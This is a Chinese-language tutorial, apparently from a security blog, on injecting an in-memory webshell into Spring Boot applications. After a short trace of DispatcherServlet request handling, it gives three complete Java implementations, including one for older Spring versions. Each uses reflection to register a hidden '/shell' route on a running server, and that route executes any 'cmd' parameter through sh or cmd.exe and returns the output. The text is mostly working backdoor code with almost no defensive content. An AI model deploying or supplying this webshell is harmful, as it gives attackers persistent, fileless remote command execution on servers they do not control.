前面介绍了Tomcat下基于`Servelt API`的内存马，在如今Spring一统天下的局面下，有必要研究Spring Boot下内存马的实现。

首先得了解一个请求如何被SpringMVC的`Controller`接收到的。

在整个`Spring MVC`框架中，`DispatcherServlet`处于核心位置，它负责协调和组织不同组件完成请求处理并返回响应工作，所有的请求都通过它。由这个前端控制器将请求分发到不同的`Controller`进行处理。

`DispatcherServlet`既然是个`Servlet`，那我们关注点就在`service`方法

`FrameworkServlet#service`

-> `HttpServlet#service` 

-> `FrameworkServlet#doGet/doPost`

-> `FrameworkServlet#processRequest`

-> `DispatcherServlet#doService`

-> `DispatcherServlet#doDispatch`

这几个都是父亲和儿子之间调来调去，最后下断点在`doDispatch`

```java
@RestController
public class MyController {
    @GetMapping("/hello")
    public String hello() {
        return "Hello";
    }
}
```








```java
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

@Controller
public class InjectController {

    @ResponseBody
    @RequestMapping("/inject")
    public String inject() throws Exception {
        System.out.println("i am in");
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
        configField.setAccessible(true);
        RequestMappingInfo.BuilderConfiguration config =
                (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
        Method method = MemShell.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
        RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                .options(config)
                .build();
        MemShell memShell = new MemShell();
        mappingHandlerMapping.registerMapping(info, memShell, method);

        return "ok";
    }

    public class MemShell {
        public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        }
    }
}
```







```java
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

public class MemShell {
    public MemShell() throws Exception {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
        configField.setAccessible(true);
        RequestMappingInfo.BuilderConfiguration config =
                (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
        Method method = Shell.class.getMethod("inject", HttpServletRequest.class, HttpServletResponse.class);
        RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                .options(config)
                .build();
        Shell shell = new Shell();
        mappingHandlerMapping.registerMapping(info, shell, method);
    }

    public static class Shell {
        public void inject(HttpServletRequest request, HttpServletResponse response) throws IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        }
    }
}
```



低版本：

```java
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

public class MemShell {
    public MemShell() throws Exception {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        Method method = Shell.class.getDeclaredMethod("inject", HttpServletRequest.class, HttpServletResponse.class);
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Shell(), method);
    }

    public static class Shell {
        public Shell() {
        }

        public void inject(HttpServletRequest request, HttpServletResponse response) throws IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        }
    }
}
```

